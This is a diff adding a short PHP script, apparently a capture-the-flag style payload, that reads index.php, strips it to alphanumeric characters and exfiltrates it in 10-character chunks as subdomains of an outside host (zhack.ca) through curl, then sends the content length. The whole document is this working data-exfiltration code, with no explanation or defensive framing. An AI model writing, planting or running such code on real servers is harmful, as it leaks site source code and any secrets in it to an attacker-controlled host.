@@ -1,0 +1,14 @@
+<?php
+$content = file_get_contents('index.php');
+$content = preg_replace("/[^a-zA-Z0-9\n\r]+/", "", $content);
+foreach(str_split($content, 10) as $exp) {
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $exp.".ed04cd6e05158e3e7e43.d.zhack.ca");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	$output = curl_exec($ch);
+}
+curl_setopt($ch, CURLOPT_URL, strlen($content).".ed04cd6e05158e3e7e43.d.zhack.ca");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$output = curl_exec($ch);
+curl_close($ch);
+?>
